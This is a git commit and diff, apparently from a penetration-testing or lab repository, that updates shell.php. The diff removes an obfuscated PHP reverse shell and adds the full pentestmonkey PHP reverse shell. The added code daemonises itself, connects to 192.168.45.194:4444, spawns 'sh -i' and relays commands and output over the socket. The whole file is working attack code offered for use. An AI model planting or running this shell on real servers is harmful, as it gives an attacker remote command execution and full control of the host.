d0f767987525f0de783897643f3e372e7685c80c
Pattharadanai-Sanitjairak <pat.sanitjairak@gmail.com>
2024-07-08 14:05:11 +0700

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,109 +1,116 @@
-    /*<?php /**/
-      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
-      $dis=@ini_get('disable_functions');
-      if(!empty($dis)){
-        $dis=preg_replace('/[, ]+/',',',$dis);
-        $dis=explode(',',$dis);
-        $dis=array_map('trim',$dis);
-      }else{
-        $dis=array();
-      }
-      
-    $ipaddr='192.168.45.194';
-    $port=4444;
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
 
-    if(!function_exists('ocQwvKsGAt')){
-      function ocQwvKsGAt($c){
-        global $dis;
-        
-      if (FALSE !== stristr(PHP_OS, 'win' )) {
-        $c=$c." 2>&1\n";
-      }
-      $YxaV='is_callable';
-      $wIeQd='in_array';
-      
-      if($YxaV('shell_exec')&&!$wIeQd('shell_exec',$dis)){
-        $o=`$c`;
-      }else
-      if($YxaV('proc_open')&&!$wIeQd('proc_open',$dis)){
-        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
-        $o=NULL;
-        while(!feof($pipes[1])){
-          $o.=fread($pipes[1],1024);
-        }
-        @proc_close($handle);
-      }else
-      if($YxaV('popen')&&!$wIeQd('popen',$dis)){
-        $fp=popen($c,'r');
-        $o=NULL;
-        if(is_resource($fp)){
-          while(!feof($fp)){
-            $o.=fread($fp,1024);
-          }
-        }
-        @pclose($fp);
-      }else
-      if($YxaV('system')&&!$wIeQd('system',$dis)){
-        ob_start();
-        system($c);
-        $o=ob_get_contents();
-        ob_end_clean();
-      }else
-      if($YxaV('exec')&&!$wIeQd('exec',$dis)){
-        $o=array();
-        exec($c,$o);
-        $o=join(chr(10),$o).chr(10);
-      }else
-      if($YxaV('passthru')&&!$wIeQd('passthru',$dis)){
-        ob_start();
-        passthru($c);
-        $o=ob_get_contents();
-        ob_end_clean();
-      }else
-      {
-        $o=0;
-      }
-    
-        return $o;
-      }
-    }
-    $nofuncs='no exec functions';
-    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
-      $s=@fsockopen("tcp://192.168.45.194",$port);
-      while($c=fread($s,2048)){
-        $out = '';
-        if(substr($c,0,3) == 'cd '){
-          chdir(substr($c,3,-1));
-        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
-          break;
-        }else{
-          $out=ocQwvKsGAt(substr($c,0,-1));
-          if($out===false){
-            fwrite($s,$nofuncs);
-            break;
-          }
-        }
-        fwrite($s,$out);
-      }
-      fclose($s);
-    }else{
-      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
-      @socket_connect($s,$ipaddr,$port);
-      @socket_write($s,"socket_create");
-      while($c=@socket_read($s,2048)){
-        $out = '';
-        if(substr($c,0,3) == 'cd '){
-          chdir(substr($c,3,-1));
-        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
-          break;
-        }else{
-          $out=ocQwvKsGAt(substr($c,0,-1));
-          if($out===false){
-            @socket_write($s,$nofuncs);
-            break;
-          }
-        }
-        @socket_write($s,$out,strlen($out));
-      }
-      @socket_close($s);
-    }
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '192.168.45.194';
+$port = 4444;
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; sh -i';
+$daemon = 0;
+$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+chdir("/");
+
+umask(0);
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?>
